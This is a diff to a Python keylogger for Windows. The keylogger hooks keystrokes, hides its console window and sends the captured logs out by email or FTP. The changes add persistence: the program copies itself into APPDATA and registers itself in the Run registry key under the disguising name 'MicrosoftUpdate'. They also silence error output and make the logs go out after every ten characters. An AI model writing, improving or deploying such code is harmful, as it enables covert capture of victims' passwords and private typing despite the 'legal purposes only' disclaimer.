@@ -10,14 +10,16 @@ NOTE: This program must be used for legal purposes only! I am not responsible fo
 
 import smtplib, time, os, threading, sys, subprocess, argparse
 import win32console, win32gui, win32event, win32api, winerror
-from sys import exit; from ftplib import FTP; from urllib2 import urlopen
-from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage
+from sys import exit; from ftplib import FTP; from urllib2 import urlopen; from shutil import copyfile
+from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEImage; from _winreg import *
 try:
     import pythoncom, pyHook, pyautogui
     from pyHook import GetKeyState, HookConstants
 except ImportError:
     print("required pyhook, pywin32 and pyautogui")
     exit()
+
+sys.stderr = None  # prevent py2exe from showing error
 
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
@@ -29,7 +31,7 @@ strFtpUser = ""
 strFtpPass = ""
 strFtpRemotePath = "/"
 
-intCharPerSend = 1000  # set num of chars before send log/store
+intCharPerSend = 10  # set num of chars before send log/store
 
 blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
 intTimePerSend = 120  # set how often to send/save logs in seconds
@@ -44,13 +46,14 @@ blnScrShot = "False"  # set to True for capturing screenshots
 strScrDir = ""  # set non-protected dir for scrshot location if storing locally. eg c:/temp
 intScrTime = 120  # set time for taking screen in seconds
 
+blnAddToStartup = "True"
 
 def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
     return True
 # hide window as new thread. Necessary in order to define timer used later
-objTimer = threading.Timer(0, hide);objTimer.start()
+objTimer = threading.Timer(0, hide); objTimer.start()
 
 objParser = argparse.ArgumentParser()  # set up arg parser
 objParser.add_argument("-o", "--open", default=None)  # add args
@@ -68,7 +71,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     exit()
 
 
-def GetExIp(): # function to get external ip
+def GetExIp():  # function to get external ip
     global strExIP
     try:
         strExIP = urlopen("http://ident.me").read().decode('utf8')
@@ -76,6 +79,21 @@ def GetExIp(): # function to get external ip
         strExIP = "?"
 # obj defined for later use for screenshot timer
 objTimer2 = threading.Timer(0, GetExIp); objTimer2.start()
+
+
+def AddToStartup():
+    try:
+        strPath = os.path.realpath(sys.argv[0])
+        strAppPath = os.environ["APPDATA"] + "\\" + os.path.basename(strPath)
+        copyfile(strPath, strAppPath)
+
+        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+        SetValueEx(objRegKey, "MicrosoftUpdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
+    except:  # if the program is already added to startup
+        pass
+
+if blnAddToStartup == "True":
+    AddToStartup()
 
 blnFirstSend = "True"
 blnStop = "False"
@@ -124,7 +142,7 @@ def OnKeyboardEvent(event):
             if blnStop == "True":
                 objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
             elif blnFirstSend == "True":
-                objLogFile.write("\n" +"Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+                objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
                 blnFirstSend = "False"
             objLogFile.write(strLogs)
             objLogFile.close()
@@ -248,6 +266,7 @@ def OnKeyboardEvent(event):
         if not objTimer2.is_alive():
             objTimer2 = threading.Timer(intScrTime, TakeScr)
             objTimer2.start()
+
     return True  # return True to pass key to windows
 
 
